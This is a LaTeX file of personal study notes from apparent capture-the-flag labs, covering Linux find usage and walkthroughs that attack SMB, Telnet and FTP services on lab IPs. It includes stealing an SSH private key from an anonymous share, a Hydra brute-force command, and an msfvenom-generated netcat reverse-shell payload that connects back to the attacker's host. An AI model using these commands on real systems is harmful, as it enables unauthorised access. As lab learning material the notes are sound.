\documentclass[12pt]{article}
\usepackage[margin=1in]{geometry}
\usepackage{graphicx}
\usepackage{amsmath}
\usepackage{amsthm}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{array}
\usepackage{enumerate}
\usepackage{slashed}
\usepackage{colonequals}
\usepackage{fancyhdr}
\usepackage{import}
\usepackage{xifthen}
\usepackage{pdfpages}
\usepackage{transparent}
\usepackage{enumitem}

\newcommand{\incfig}[1]{%
    \def\svgwidth{\columnwidth}
    \import{/home/arbegla/figures/}{#1.pdf_tex}
}

\pagestyle{fancy}
\fancyhf{}
\rhead{}
\lhead{}
\rfoot{\thepage}
\setlength{\headheight}{10pt}

\newtheorem{theorem}{Theorem}[section]
\newtheorem{corollary}{Corollary}[theorem]
\newtheorem{prop}{Proposition}[section]
\newtheorem{lemma}[theorem]{Lemma}
\theoremstyle{definition}
\newtheorem{definition}{Definition}[section]
\theoremstyle{definition}
\newtheorem{exmp}{Example}[section]

\newcommand{\abs}[1]{\lvert #1 \rvert}
\newcommand{\bigabs}[1]{\Bigl \lvert #1 \Bigr \rvert}
\newcommand{\bigbracket}[1]{\Bigl [ #1 \Bigr ]}
\newcommand{\bigparen}[1]{\Bigl ( #1 \Bigr )}
\newcommand{\ceil}[1]{\lceil #1 \rceil}
\newcommand{\bigceil}[1]{\Bigl \lceil #1 \Bigr \rceil}
\newcommand{\floor}[1]{\lfloor #1 \rfloor}
\newcommand{\bigfloor}[1]{\Bigl \lfloor #1 \Bigr \rfloor}
\newcommand{\norm}[1]{\| #1 \|}
\newcommand{\bignorm}[1]{\Bigl \| #1 \Bigr \| #1}
\newcommand{\inner}[1]{\langle #1 \rangle}
\newcommand{\set}[1]{{ #1 }}


\begin{document}
\title{Cyber Notes}
\author{Quin Darcy}
\date{May, 24 2021}
\maketitle
\tableofcontents\newpage
\section{Linux Fundamentals}
    \subsection{Using Find}
        The find command is very powerful! This command allows you to quickly
        search across the entire filesystem. The syntax of the find command can
        be broken down as \textit{find where what}. Here are some examples:
        \begin{exmp}
            Find all files whose name ends with ``.xml"
            \begin{equation*}
                \text{find / -type f -name ``*.xml"}
            \end{equation*}
        \end{exmp}
        \begin{exmp}
            Find all the files in the /home directory whose name is
            ``user.txt" (case insensitive)
            \begin{equation*}
                \text{find /home -type f -iname user.txt}
            \end{equation*}
        \end{exmp}
        \begin{exmp}
            Find all directories whose name contains the word ``exploits"
            \begin{equation*}
                \text{find / -type d -name ``*exploits*"}
            \end{equation*}
        \end{exmp}
        \begin{exmp}
            Find all the files owned by the user ``kittycat"
            \begin{equation*}
                \text{find / -type f -user kittycat}
            \end{equation*}
        \end{exmp}
        \begin{exmp}
            Find all the files that are exactly 15- bytes in size
            \begin{equation*}
                \text{find / -type f -size 150c}
            \end{equation*}
        \end{exmp}
        \begin{exmp}
            Find all the files in the home directory with size less than 2KiB
            and extension ``.txt"
            \begin{equation*}
                \text{find /home -type f -size -2k -name ``*.txt"}
            \end{equation*}
        \end{exmp}
        \begin{exmp}
            Find all the files that are exactly readable and writeable by the
            owner, and only readable by everyone else (use octal format)
            \begin{equation*}
                \text{find / -type f -perm 644}
            \end{equation*}
        \end{exmp}
        \begin{exmp}
            Find all the files with write permissions for the group ``others",
            regardless of any other permissions, with extension ``.sh" (use
            symbolic format)
            \begin{equation*}
                \text{find / -type f -perm -o=w -name ``*.sh"}
            \end{equation*}
        \end{exmp}
        \begin{exmp}
            Find all the files that were not accessed in the last 10 days with
            the extension ``.png"
            \begin{equation*}
                \text{find / -type f -atime +10 -name ``*.png"}
            \end{equation*}
        \end{exmp}
\section{Network Protocols}
    A network protocol includes all the rules and conventions for communication
    between network devices, including ways devices can identify and make
    connections with each other. There are also formatting rules that specify
    how data is packaged into sent and received messages. \par Without
    protocols, devices would lack the ability to understand the electronic
    signals they send to each other over network connections. 
    \subsection{SMB}
        SMB (Server Message Block Protocol) is a client-server communication
        protocol used for sharing access to files, printers, serial ports, and
        other resources on a network. This protocol allows users to communicate
        with remote computers and servers, in order to use their resources, open,
        and edit files. It is also referred to as the server-client protocol since
        the server has a resource which it can share with the client.\par At the
        user level, SMB authentication requires a username and password to allow
        access to the server. The SMB protocol is known as a response-request
        protocol, meanind that it transmits multiple messages between client
        and server to establish a connection. Clients connect to servers using
        TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and
        RFC1002).\par Once a connection is established, the client can send
        commands (SMBs) to the server that allow them access to shares (shared
        file system), open, read, and write files. Both Microsoft Windows and
        Unix (Samba) support SMB protocol. 
        \begin{exmp}
            In this example, we will look at one way to exploit the SMB
            protocol. This exploitation will rely upon a common
            misconfiguration in the system which allows anonymous share access.
            After gaining this access, we will obtain a shell. \par We will be
            using 3 tools in this example:
            \begin{enumerate}
                \item\textbf{nmap} -- We will use nmap to begin our enumeration
                    (creating a map of the target's network). Specifically, we
                    will be conducting a port scan of all ports (command: -p-).
                    Along side the port scan, we will be running an OS
                    detection (command: -O), version detection (command: -sV),
                    and traceroute (command: --traceroute). The command which
                    deploys all of these functions together is -A. 
                \item\textbf{Enum4Linux} Enum4Linux is a tool used to enumerate
                    SMB shares on both Windows and Linux systems. It is
                    basically a wrapper around the tools in the Samba package
                    and makes it easy to quickly extract information from the
                    target pertaining to SMB.\par Some common commands with
                    this tool are getting userlist (command: -U), get machine
                    list (command: -M), get namelist dump (command: -N), get
                    sharelist (command: -S), get password policy information
                    (command: -P), get group and member list (command: -G), all
                    of the above (-A).
                \item\textbf{SMBClient} SMBClient that is part of the Samba
                    software suite. It communicates with a LAN Manager server,
                    offering an interface similar to that of the ftp
                    program.\par We can remotely access the SMB share using the
                    syntax: smbclient //[IP]/[SHARE] -$<$tag$>$. Some common tags
                    (or commands) are to specify the user (command: -U [name]),
                    to specify the port (command: -p [port]).
            \end{enumerate}
            We are assuming that we know our target's IP address, 10.10.2.195.
            After conducting our port scan with: nmap -A -vv 10.10.2.195, we
            find that the target has 3 open ports. The port that SMB is running
            on is: \textbf{139/445}.\par Now, after running: enum4linux -A 10.10.2.195,
            we get that the workgroup name is: \textbf{WORKGROUP}. The name of
            the machine is: \textbf{POLOSMB}. The version of the operating system being
            run is: \textbf{6.1}. An interesting looking share is called:
            \textbf{profiles}, which is described as ``User Profriles".
            \par Now that we have the name of our share, we
            can test to see if it is configured to allow anonymous access. In
            other words, by typing:\par smbclient//10.10.2.195/profiles -U
            Anonymous -p 445\par we are prompted to enter a password, in which
            we do not enter one and instead just hit ENTER. We are in! After
            entering this server we see one file that sticks out: ``Working
            From Home Information.txt". Interesting. Running the command
            \textbf{more} before the file name, it opens and we see that it is
            an email to an employee named John Cactus. The email essentially
            says that John will be using ssh to login to his computer remotely.
            Ah hah, looking back at the contents of the directory, we see that
            there is a directory named \textbf{.ssh}. This directory contains
            a file called \textbf{id\_rsa} which has John's private RSA key.\par
            We can download this file onto our local machine by running
            \textbf{mget id\_rsa}. Once we are back into our local machine, we
            need to change the permissions of this new file. We'll change it to
            600 so that we can read and write. It was not mentioned before, but
            in our enum4linux command, we saw that there was a user with the
            username: \textbf{cactus}. With the username, IP, and RSA keys, we
            can know login as John onto his machine! \par Running the following
            command: \textbf{ssh -i id\_rsa cactus@10.10.2.195}, we obtain
            access to the main server that John logs onto when at work. 
        \end{exmp}
    \subsection{Telnet}
        Telnet is an application protocol which allows you, with the use of
        a telnet client, to connect to and execute on a remote machine that's
        hosting a telnet server.\par The user connects to the server by using the
        Telnet protocol, which means entering \textbf{telnet} into a command
        prompt. The user then executes commands on the server by specific Telnet
        commands in the Telnet prompt. You can connect to a telnet server with the
        following syntax: \textbf{telnet [IP] [PORT]}.
        \begin{exmp}
            In this example, we will find that after doing an nmap scan, there
            is one port open on our target's machine (10.10.234.253). 
            Port 8012. This port is
            using the TCP protocol. We will try using the telnet command on
            this port.\par After running our nmap scan, we also come to find
            that this port is titled: \textbf{Skidies Backdoor} and from this
            we can assume there is a user with username \textbf{Skidy}.\par We run:
            \textbf{telnet 10.10.234.253 8012} and are met with the welcome
            message: \textbf{SKIDY'S BACKDOOR}. However, we do not appear to be
            able to run any commands. To investigate this, we will be using a tool
            called \textbf{tcpdump}. This prints out a description of the contents
            on a network interface that match the Boolean expression; the
            description is preceeded by a time stamp, printed, by default, as
            hours, minutes, seconds, and so on. Upon completion, tcpdump will
            report counts of packets \textbf{captured}, packets
            \textbf{received by filter}, and packets \textbf{dropped by kernel}. We
            will be listening specifically for ICMP traffic, which pings operate
            on.\par To be more precise, what we are going to do is open up another
            terminal, run 
            \textbf{sudo tcpdump ip proto $\backslash\backslash$icmp -i eth0}. This
            starts a tcpdump listener. Then in our previous terminal where in which
            we are logged onto the telnet server, we will run \textbf{.RUN ping
            [local IP] -c 1}. This essentially sends a ping request to our local
            machine, the one which we have tcpdump listening for ping requests.
            Doing this, we see that we do in fact receive the ping! This tells us
            that we are able to execute system commands and reach our local
            machine. \par With this ability, we are going to try and generate
            a reverse shell payload using msfvenom. \textbf{MsfVenom} is a payload
            generator. It will generate and encode a netcat reverse shell for us.
            The syntax will be:\par \textbf{msfvenom -p cmd/unix/reverse\_netcat
            lhost=[local eth0 ip] lport=4444 R}.\par Here the \textbf{-p=payload},
            \textbf{lhost=your machine's IP}, \textbf{lport=the port to listen to},
            and \textbf{R=export the payload in raw format}.\par Note that this
            command will be run on your local machine. Doing so we get the
            following generated payload:
            \begin{equation*}
                \begin{split}
                \text{\textbf{mkfifo /tmp/ykjn; nc 10.10.1.63 4444 0$<$/tmp/ykjn
                $|$ /bin/sh $>$}}\\ \text{\textbf{/tmp/ykjn 2$>$\&1; rm /tmp/ykjn}}
                \end{split}
            \end{equation*}
            Now we start a netcat listener on our machine by using the
            command:\par\textbf{nc -lvp 4444}. Finally, we just need to copy
            and paste our payload into the telnet session! \par After doing
            that, we are notified on our machine that the connection was
            received. And we can now have a shell from their machine on our
            machine. Doing a simple \textbf{ls} reveals the .txt file which
            contains our flag.  
        \end{exmp}
    \subsection{FTP}
        File Transfer Protocol. This protocol is used to allow remote transfer
        of files over a network. It uses a client-server model to do this, and
        relays commands and data in a very efficient way. The standard FTP port
        is 21.\par The FTP server may support either Active or Passive
        connetions, or both.
        \begin{enumerate}
            \item In an Active FTP connection, the client opens a port and
                listens. The server is required to actively connect to it.
            \item In a Passive FTP connection, the server opens a port and
                listens (passively) and the client connects to it. 
        \end{enumerate}
        This separation of command information and data into separate channels
        is a way of being able to send commands to the server without having to
        wait for the current data transfer to finish. \par We are going to be
        exploiting an anaymous FTP login, to see what files we can access-- and
        if they contain any information that might alow us to pop a shell on
        the system. This is a comman pathway in CTF challenges, and mimics
        a real-life careless implementation of FTP servers.\par As we're going
        to be logging into an FTP server, we're going to need to make sure
        there is an ftp client installed on the system. There should be one
        installed by default on most Linux operating systems, such as Kali or
        Parrot.
        \begin{exmp}
            In running an nmap scan on our victim, we find that they
            have 2 open ports. Port 21 is running an FTP variant \textbf{vsftpd}.
            This stands for \textbf{very secure FTP daemon}. It is an FTP server
            for Unix-like systems, including Linux.\par To check to see if we can
            login anonymously, we simply run \textbf{ftp [IP]} and entering
            \textbf{anonymous} as the username, and entering nothing when propted
            for a password. In this case, it works -- the server allows anoymous
            access! \par Listing the contents of the directory, there is a file
            \textbf{PUBLIC\_NOTICE.txt}, the message in this file is signed by
            a person named Mike. So perhaps a username might be \textbf{mike}.\par
            Similar to Telnet, when using FTP, both the command and data channels
            are unencrypted. Any data sent over these channels can be intercepted
            and read as plaintext.\par The exploit method we will use is
            a \textbf{bruteforce} password attack of the FTP server. The tool we
            will use for this exploit is \textbf{Hydra}. \par Hydra is a very fast
            online password cracking tool, which can perform rapid dictionary
            attacts against more that 50 Protocols. The sytax for the command we
            will run is 
            \begin{equation*}
                \text{\textbf{hydra -t -4 -l [UNAME] -P /path/to/wordlist -vV [IP]
                [protocol]}}
            \end{equation*}
            Running this command, we come to find that Mike's password is
            \textbf{password}. What a fucking idiot. Now launching our ftp client,
            we can login as mike with password password and boom! We're in.
        \end{exmp}
    \subsection{NFS}
        NFS stands for \textbf{Network File System} and allows a system to
        share directories and files with others over a network. By using NFS,
        users and programs can access files on remote systems almost as it they
        were local files. It does this by mounting all, or a portion of a file
        system on a server. The portion of the file system that is mounted can
        be accessed by clients.\par First, the client will request to mount
        a directory from a remote host on a local directory just the same way
        it can mount a physical device. The mount service will then act as to
        connect to the relevant mount daemon using RPC.\par The server checks
        if the user has permission to mount whatever directory was requested.
        It will then return a file handlewhich uniquely identifies each file
        and directory that is on the server. \par If someone wants to access
        a file using NFS, an RPC call is placed to NSFD (NSF Daemon) on the
        server. This call takes parameters:
        \begin{itemize}
            \item The file handle
            \item The name of the file to be accessed
            \item The user's user ID
            \item The user's group ID
        \end{itemize}
        These are used in determining access writes to the specified file. 
\section{MISC.}
    \subsection{Mounting}
        Mounting is a process by which the operating system makes files and 
        directories on a storage device availible for users to access. 
        In general, the process of mounting comprises the operating system 
        acquiring access to the storage medium; recognizing, reading, and 
        processing file system structure and metadata on it before registering 
        them to the virtual file system (VFS) component. The location in VFS 
        that the mounted medium was registered is called \textbf{mount point}.
        \par A mount point is a location in the partition used as a root
        filesystem. 
    \subsection{RPC}
        This stands for \textbf{Remote Procedure Call Protocol} and it is
        a library of procedures which allows one process (the client process)
        to direct another process (the server process) to run procedure calls
        as if the client process had run the calls in its own address space.                                                                                
\end{document}
